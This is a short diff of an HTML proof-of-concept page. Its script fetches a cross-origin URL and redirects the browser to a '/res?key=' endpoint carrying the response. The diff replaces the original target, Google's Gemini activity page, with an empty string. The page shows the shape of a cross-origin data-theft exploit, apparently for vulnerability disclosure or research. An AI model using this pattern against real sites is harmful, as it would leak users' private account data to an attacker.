@@ -11,7 +11,7 @@
     <center> <div id="poc"></div></center>
     <script type="text/javascript">
         const request = new XMLHttpRequest()
-        request.open("get", "https://myactivity.google.com/product/gemini?utm_source=gemini", true)
+        request.open("get", "", true)
         request.onload = ()=>{
             window.location.href = "/res?key=" + request.responseText
             // document.getElementById('poc').innerHTML= request.responseText;
